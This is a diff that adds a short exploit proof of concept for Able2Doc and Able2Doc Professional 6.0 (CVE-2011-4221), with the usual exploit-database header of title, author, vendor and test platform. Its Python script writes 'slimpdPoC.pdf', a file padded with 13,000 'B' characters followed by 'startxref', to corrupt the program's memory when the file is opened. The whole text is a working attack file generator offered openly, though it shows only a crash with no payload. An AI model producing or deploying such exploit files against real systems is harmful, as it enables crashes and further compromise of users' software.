@@ -1,0 +1,17 @@
+# Exploit Title: Able2Doc and Able2Doc Professional v 6.0 memory corruption
+# Date: June 24 2012
+# Exploit Author: Carlos Mario Penagos Hollmann
+# Vendor Homepage: www.investintech.com
+# Version:6.0
+# Tested on: Windows 7
+# CVE : cve-2011-4221
+
+
+payload ="B"*13000
+crash="startxref"
+pdf=payload+crash
+
+filename = "slimpdPoC.pdf"
+file = open(filename,"w")
+file.writelines(pdf)
+file.close()
